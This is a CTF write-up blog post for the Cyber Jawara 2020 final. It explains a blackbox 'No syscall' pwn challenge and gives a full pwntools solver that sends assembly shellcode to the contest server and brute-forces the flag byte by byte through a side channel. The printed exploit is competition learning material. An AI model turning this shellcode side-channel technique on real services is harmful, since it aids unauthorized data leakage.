---
layout: post
title:  "Cyber Jawara 2020 Final "
date:   2020-10-18
categories: ctf
description: Writeup Cyber Jawara 2020 Final
tags: ctf-writeup
---

Cyber Jawara is the first CTF in Indonesia and this is the 9th cyber jawara series, cyber jawara is supported by a lot of cybersecurity companies and the government my team glut0r is qualified to compete in the final this year.
after competing with a lot of CTF team in Indonesia. the final section is held at hotel Padma Bali, but due to
the outbreak, the final section is running online.


<img src="/images/cj2020final/poster.jpg"/>



# No syscall 

### Description:


### Solution:

in this challenge we weren't given any binary, so we have to leak the flag from the service. to solve this challenge we can brute the flag
each byte, during my blackbox test, i found rsp+16 can help us to give a signal so we can use rsp+16 to inform as if we input the correct byte.

<img src="/images/cj2020final/no-syscall.png"/>



Solver:

{% highlight python %}

#!/usr/bin/python
# -*- coding: utf-8 -*-
from pwn import *

context.arch = 'amd64'


def main():
    tmp = ''
    pos = 0
    while True:
        for i in range(0xff):
            r = remote('1337.cyber.jawara.systems', 2001)
            r.recvuntil(':')
            flag = int(r.recv(15).replace('\n', ''), 16)
            guess = i
            log.info('flag address: ' + hex(flag))
            log.info('flag: ' + tmp)
            back_to_main = '''
					mov r8, [rsp-16]
					call r8
			'''.format(flag)
            print_msg = '''
					mov r15, [rsp-16]
					mov al, byte ptr [{}]
					cmp al, {}
					je go
					mov rdx, [rsp+3]
					call rdx
			go:
					call r15
			'''.format(flag + pos, guess)
            sh = asm(print_msg)
            r.sendlineafter(':', sh)
            k = r.recvline()
            log.info('res: ' + k)
            if 'flag' in k:
                tmp += chr(i)
                pos += 1
                break
            if '}' in tmp:
                print tmp
                raw_input("done")

            # r.interactive()

            r.close()


if __name__ == '__main__':
    main()


{% endhighlight %}

FLAG: CJ2020{~51d3#ch4NnEl~}




